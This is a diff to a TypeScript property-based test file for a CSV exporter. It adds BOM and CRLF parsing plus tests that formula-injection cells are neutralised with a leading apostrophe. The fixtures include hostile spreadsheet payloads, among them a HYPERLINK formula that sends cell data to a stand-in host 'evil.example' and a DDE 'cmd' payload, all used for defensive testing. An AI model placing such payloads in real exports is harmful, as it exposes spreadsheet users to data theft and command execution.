@@ -1,6 +1,6 @@
 import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
 import fc from "fast-check";
-import { downloadCSV, exportRecords } from "./export";
+import { CSV_BOM, downloadCSV, exportRecords } from "./export";
 
 /* ----------------------------------------------------------------------------
  * Capture the CSV text handed to the browser download. jsdom implements neither
@@ -39,10 +39,15 @@ function captured(): string {
   return lastText!;
 }
 
+/** U+FEFF, the UTF-8 byte order mark, spelled independently of export.ts. */
+const BOM = String.fromCharCode(0xfeff);
+
 /**
- * A strict RFC-4180-style parser: cells split on commas, rows on newlines,
- * BOTH only outside double quotes; "" inside a quoted cell is a literal quote.
- * Written independently of export.ts so the two cannot share a bug.
+ * A strict RFC-4180-style parser: an optional UTF-8 BOM is skipped; cells
+ * split on commas, rows on CRLF, BOTH only outside double quotes; "" inside a
+ * quoted cell is a literal quote. A bare CR or LF outside quotes is data, so a
+ * line break that escaped its quotes shows up as a mismatch. Written
+ * independently of export.ts so the two cannot share a bug.
  */
 function parseCsv(text: string): string[][] {
   const rows: string[][] = [];
@@ -50,7 +55,7 @@ function parseCsv(text: string): string[][] {
   let cell = "";
   let inQuotes = false;
   let cellStarted = false;
-  let i = 0;
+  let i = text.startsWith(BOM) ? 1 : 0;
   while (i < text.length) {
     const ch = text[i];
     if (inQuotes) {
@@ -81,13 +86,13 @@ function parseCsv(text: string): string[][] {
       i++;
       continue;
     }
-    if (ch === "\n") {
+    if (ch === "\r" && text[i + 1] === "\n") {
       row.push(cell);
       rows.push(row);
       row = [];
       cell = "";
       cellStarted = false;
-      i++;
+      i += 2;
       continue;
     }
     cell += ch;
@@ -99,9 +104,21 @@ function parseCsv(text: string): string[][] {
   return rows;
 }
 
+const TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];
+
+/**
+ * How a text cell reads back once exported — the injection rule restated
+ * independently of export.ts: text starting with = + - @ tab or CR (and not
+ * just a plain number) gains a leading apostrophe; everything else is as given.
+ */
+function asExported(cell: string): string {
+  const trigger = cell.length > 0 && TRIGGERS.includes(cell[0]);
+  return trigger && !/^-?\d+(\.\d+)?$/.test(cell) ? `'${cell}` : cell;
+}
+
 /* ----------------------------- Arbitraries ----------------------------- */
 
-// Hostile cell content: delimiters, quotes, newlines, Bangla, emoji, very long text.
+// Hostile cell content: delimiters, quotes, newlines, Bangla, emoji, formulas, very long text.
 const nastyCell = fc.oneof(
   { weight: 4, arbitrary: fc.string() },
   {
@@ -116,7 +133,13 @@ const nastyCell = fc.oneof(
       'mix: "q", comma, \n newline',
       "\rcarriage-return-only",
       "",
-      ","
+      ",",
+      '=HYPERLINK("https://evil.example/?d="&E2,"View")', // formula injection
+      "+cmd|' /C calc'!A0",
+      "-2+3",
+      "@SUM(A1)",
+      "\t=1+1",
+      "-12.50" // a plain negative number stays as it is
     ),
   },
   { weight: 1, arbitrary: fc.string().map((s) => `"${s}"`) }, // fully-quoted-looking cells
@@ -134,11 +157,11 @@ const tableArb = fc.integer({ min: 1, max: 5 }).chain((cols) =>
 /* ----------------------------- Properties ----------------------------- */
 
 describe("CSV export roundtrip (property-based)", () => {
-  it("any table of hostile cells survives a quote-respecting CSV parse unchanged", () => {
+  it("any table of hostile cells survives a quote-respecting CSV parse (formula triggers neutralised, nothing else changed)", () => {
     fc.assert(
       fc.property(tableArb, ({ headers, rows }) => {
         downloadCSV("prop", headers, rows);
-        expect(parseCsv(captured())).toEqual([headers, ...rows]);
+        expect(parseCsv(captured())).toEqual([headers, ...rows].map((row) => row.map(asExported)));
       }),
       { numRuns: 60 }
     );
@@ -149,9 +172,38 @@ describe("CSV export roundtrip (property-based)", () => {
       fc.property(fc.array(nastyCell, { minLength: 1, maxLength: 5 }), (headers) => {
         downloadCSV("prop", headers, []);
         const parsed = parseCsv(captured());
-        expect(parsed[0]).toEqual(headers);
+        expect(parsed[0]).toEqual(headers.map(asExported));
       }),
       { numRuns: 60 }
+    );
+  });
+
+  it("no exported text cell can start a formula (unless it is just a number)", () => {
+    const formulaLike = fc.tuple(fc.constantFrom(...TRIGGERS), fc.string()).map(([first, rest]) => `${first}${rest}`);
+    fc.assert(
+      fc.property(fc.array(fc.oneof(nastyCell, formulaLike), { minLength: 1, maxLength: 6 }), (cells) => {
+        downloadCSV("prop", ["h"], cells.map((c) => [c]));
+        for (const [cell] of parseCsv(captured()).slice(1)) {
+          const startsFormula = cell.length > 0 && TRIGGERS.includes(cell[0]);
+          expect(startsFormula && !/^-?\d+(\.\d+)?$/.test(cell)).toBe(false);
+        }
+      }),
+      { numRuns: 80 }
+    );
+  });
+
+  it("the file starts with a UTF-8 BOM and separates rows with CRLF (and nothing else)", () => {
+    expect(CSV_BOM).toBe(BOM);
+    const word = fc.stringMatching(/^[a-z]{1,6}$/);
+    fc.assert(
+      fc.property(fc.array(fc.tuple(word, word), { minLength: 1, maxLength: 5 }), (rows) => {
+        downloadCSV("plain", ["a", "b"], rows);
+        const text = captured();
+        expect(text.startsWith(`${BOM}a,b\r\n`)).toBe(true);
+        expect(text.split("\r\n")).toHaveLength(rows.length + 1);
+        expect(text.replace(/\r\n/g, "")).not.toMatch(/[\r\n]/);
+      }),
+      { numRuns: 40 }
     );
   });
 
@@ -207,7 +259,7 @@ describe("CSV export roundtrip (property-based)", () => {
         ]);
         const parsed = parseCsv(captured());
         expect(parsed[0]).toEqual(["Member, name", "Minutes"]);
-        expect(parsed.slice(1)).toEqual(records.map((r) => [r.name, String(r.minutes)]));
+        expect(parsed.slice(1)).toEqual(records.map((r) => [asExported(r.name), String(r.minutes)]));
       }),
       { numRuns: 60 }
     );
